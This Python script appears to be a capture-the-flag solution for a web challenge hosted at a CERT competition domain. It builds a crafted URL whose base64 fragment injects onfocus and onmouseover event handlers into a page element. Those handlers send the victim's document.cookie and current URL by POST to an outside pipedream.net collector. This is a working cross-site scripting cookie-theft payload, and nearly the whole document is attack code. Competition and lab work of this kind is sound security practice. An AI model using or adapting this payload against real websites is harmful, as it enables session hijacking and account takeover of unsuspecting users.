import base64
import json

encoded_text = "W3sibGV0dGVyIjoibSIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19LHsibGV0dGVyIjoiZSIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19LHsibGV0dGVyIjoiZCIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19LHsibGV0dGVyIjoiYSIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19LHsibGV0dGVyIjoibCIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19LHsibGV0dGVyIjoicyIsImF0dHJpYnV0ZXMiOnsiY2xhc3MiOiJjZWxsIGZvbnQtbW9ub3NwYWNlIGdyZWVuIn19XQ=="  # Base64 encoded string
decoded_bytes = base64.b64decode(encoded_text)
decoded_text = decoded_bytes.decode()
data = json.loads(decoded_text)

data[0]["attributes"]["tabindex"] = "0"
data[0]["attributes"]["onfocus"] = "fetch('https://eo3vpaw322ipved.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,url:window.location.href})})"
data[0]["attributes"]["onmouseover"] = "fetch('https://eo3vpaw322ipved.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,url:window.location.href})})"

print(data)
encoded_text = base64.b64encode(json.dumps(data).encode()).decode()
print(f"https://certle.ecsc25.hack.cert.pl/#{encoded_text}")
